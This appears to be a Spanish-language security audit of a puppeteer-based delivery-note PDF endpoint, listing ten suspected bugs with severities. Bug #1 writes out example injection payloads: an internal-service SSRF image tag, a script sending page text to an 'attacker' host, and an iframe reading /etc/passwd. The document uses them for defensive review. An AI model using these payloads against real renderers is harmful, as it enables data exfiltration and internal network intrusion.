# SECCION 7 — PDF remito

## Scope
- `GET /remitos/:id/pdf` → `generateRemitoPdf` → `buildRemitoHtml` → puppeteer
- `POST /remitos/:id/signed-pdf` → `uploadSignedPdf`
- `GET /remitos/:id/signed-pdf` → `getSignedPdf`

## Bugs sospechados

### BUG #1 CRITICAL — XSS / HTML injection / SSRF via puppeteer
`buildRemitoHtml` interpola MUCHOS campos directo a HTML sin escaping:
- `${companyName}`, `${receptor.name}`, `${item.product_name}`, `${remito.delivery_address}`, `${receptor.iva}`, `${receptor.cuit}`, `${facturaRef}`, `${pedidoRef}`, `${companyCuit}`
Un item con `product_name = '<img src="http://internal-svc:8080/secret">'` — puppeteer navegará a ese recurso via `networkidle0`, **SSRF a red interna del servidor**.
Peor aún: `<script>fetch('http://attacker/'+document.body.innerText)</script>` filtra datos.
Peor aún: `<iframe src="file:///etc/passwd">` LFI.

### BUG #2 HIGH — Browser leak en error
```ts
const browser = await puppeteer.launch(...)
const page = ...
const pdf = await page.pdf(...)  // si falla aqui
await browser.close()  // nunca se ejecuta
```
Leak de procesos Chromium → DoS.

### BUG #3 HIGH — `waitUntil: 'networkidle0'`
Con user-supplied HTML, cualquier `<img>` o `<script src>` hace request. Mejor `domcontentloaded` o `load`.

### BUG #4 HIGH — `uploadSignedPdf` magic bytes solo en controller
Si alguien llama al service directo (otro modulo), no hay check. Defense-in-depth.

### BUG #5 MEDIUM — `uploadSignedPdf` guarda base64 in-column
5MB PDF = 7MB base64 = row bloat. Escala mal. (Scope: storage, documento)

### BUG #6 HIGH — `generateRemitoPdf` no valida fecha
`new Date(remito.date || remito.created_at)` — si ambos null, `Invalid Date` → "Invalid Date" en PDF visible.

### BUG #7 MEDIUM — Puppeteer sin timeout
`setContent` / `page.pdf` sin timeout. Un HTML grande o recurso lento puede colgar request indefinidamente.

### BUG #8 LOW — `companyCuit` en HTML sin escaping
Mismo vector XSS. Company data generalmente trusted, pero si admin injecta malformed data, render PDF explota.

### BUG #9 MEDIUM — getSignedPdf no valida que haya pdf_url
Retorna `null` → controller hace 404. OK pero podría no validar companyId if called directly. Actually sí valida.

### BUG #10 MEDIUM — uploadSignedPdf sin validar que remito NO este anulado
Se puede subir firmado a remito anulado. Raro pero inconsistente.
